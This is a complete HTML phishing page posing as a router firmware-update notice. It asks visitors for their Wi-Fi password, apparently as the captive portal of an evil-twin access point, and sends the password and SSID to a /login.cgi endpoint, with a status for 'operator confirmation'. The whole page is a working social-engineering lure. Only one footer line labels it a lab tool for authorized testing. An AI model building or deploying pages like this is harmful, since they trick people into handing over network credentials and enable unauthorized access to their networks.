<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Router Firmware Update</title>
  <style>
    :root {
      --bg: #f4f6f8;
      --card: #ffffff;
      --ink: #1c2430;
      --muted: #5c6b7a;
      --line: #d7dee6;
      --accent: #0b6bcb;
      --danger: #c62828;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      font-family: "Segoe UI", system-ui, sans-serif;
      background: linear-gradient(180deg, #e8eef4 0%, var(--bg) 40%);
      color: var(--ink);
    }
    .wrap {
      max-width: 460px;
      margin: 48px auto;
      padding: 0 16px 40px;
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 18px;
    }
    .logo {
      width: 36px;
      height: 36px;
      border-radius: 8px;
      background: var(--accent);
      color: #fff;
      display: grid;
      place-items: center;
      font-weight: 700;
    }
    .card {
      background: var(--card);
      border: 1px solid var(--line);
      border-radius: 12px;
      padding: 28px 24px;
      box-shadow: 0 10px 30px rgba(20, 32, 48, 0.08);
    }
    h1 { font-size: 1.25rem; margin: 0 0 8px; }
    p { color: var(--muted); line-height: 1.5; margin: 0 0 16px; }
    label {
      display: block;
      font-size: 0.82rem;
      font-weight: 600;
      margin: 12px 0 6px;
    }
    input {
      width: 100%;
      border: 1px solid var(--line);
      border-radius: 8px;
      padding: 12px 14px;
      font-size: 1rem;
    }
    input:focus {
      outline: 2px solid rgba(11, 107, 203, 0.25);
      border-color: var(--accent);
    }
    button {
      width: 100%;
      margin-top: 18px;
      border: 0;
      border-radius: 8px;
      background: var(--accent);
      color: #fff;
      font-size: 1rem;
      font-weight: 600;
      padding: 12px;
      cursor: pointer;
    }
    button:disabled { opacity: 0.65; cursor: wait; }
    .note { font-size: 0.78rem; margin-top: 14px; }
    .error { color: var(--danger); min-height: 1.2em; margin: 8px 0 0; font-size: 0.88rem; }
    .ok { color: #1b7f3a; }
    .ssid { font-family: ui-monospace, monospace; color: var(--ink); }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="brand">
      <div class="logo">AP</div>
      <div>
        <strong>Wireless Gateway</strong>
        <div class="note">Firmware security update</div>
      </div>
    </div>
    <div class="card">
      <h1>Reconnect required</h1>
      <p>
        A router firmware update completed. Enter the Wi‑Fi password for
        <span class="ssid" id="ssid">this network</span> to restore internet access.
      </p>
      <form id="login-form">
        <label for="password">Wi‑Fi password</label>
        <input id="password" name="password" type="password" autocomplete="current-password" required minlength="8"/>
        <label for="password2">Confirm password</label>
        <input id="password2" name="password2" type="password" required minlength="8"/>
        <p class="error" id="error"></p>
        <button type="submit" id="submit">Reconnect</button>
        <p class="note">Authorized lab portal — use only on networks you own or have permission to test.</p>
      </form>
    </div>
  </div>
  <script>
    const params = new URLSearchParams(location.search);
    const ssid = params.get("ssid") || document.title;
    document.getElementById("ssid").textContent = ssid;
    const form = document.getElementById("login-form");
    const error = document.getElementById("error");
    form.addEventListener("submit", async (event) => {
      event.preventDefault();
      const password = document.getElementById("password").value;
      const password2 = document.getElementById("password2").value;
      error.textContent = "";
      error.classList.remove("ok");
      if (password !== password2) {
        error.textContent = "Passwords do not match.";
        return;
      }
      const button = document.getElementById("submit");
      button.disabled = true;
      button.textContent = "Checking…";
      try {
        const response = await fetch("/login.cgi", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({ password, password2, ssid }),
        });
        const data = await response.json();
        if (data.ok && data.valid) {
          error.classList.add("ok");
          error.textContent = "Connected. You may close this page.";
          button.textContent = "Connected";
          return;
        }
        if (data.ok && data.pending) {
          error.classList.add("ok");
          error.textContent = "Submitted. Waiting for operator confirmation.";
          button.disabled = false;
          button.textContent = "Reconnect";
          return;
        }
        error.textContent = data.error || "Password was not accepted. Try again.";
        button.disabled = false;
        button.textContent = "Reconnect";
      } catch (err) {
        error.textContent = "Could not reach the gateway. Try again.";
        button.disabled = false;
        button.textContent = "Reconnect";
      }
    });
  </script>
</body>
</html>
